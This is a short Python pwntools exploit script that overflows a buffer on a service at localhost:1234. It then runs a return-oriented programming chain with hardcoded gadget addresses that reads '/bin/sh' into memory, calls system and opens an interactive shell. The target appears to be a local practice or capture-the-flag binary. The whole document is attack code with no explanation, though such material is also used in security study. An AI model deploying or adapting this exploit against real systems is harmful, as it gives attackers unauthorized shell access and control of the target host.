from pwn import *
from RopChain import *

cmd = "/bin/sh\n"
overflow = "a" * 140

########GADGETS#########
storage = 0x8049530
read_addr= 0x804832c
#in gdb: x system
sys_addr = 0xf7e30eb0
pppr = 0x80484b6
junk = 0xdeadbeef
#######################



ropChain = RopChain()
ropChain.addPopRet(3,pppr)
ropChain.addLink(read_addr,[0,storage,len(cmd)])
ropChain.addLink(sys_addr,storage)

payload = overflow + ropChain.getChain()



conn = remote('localhost', 1234)

print "sending payload..."
conn.sendline(payload)
print "writing command to memory..."
conn.sendline(cmd)
print "getting shell..."
conn.interactive()
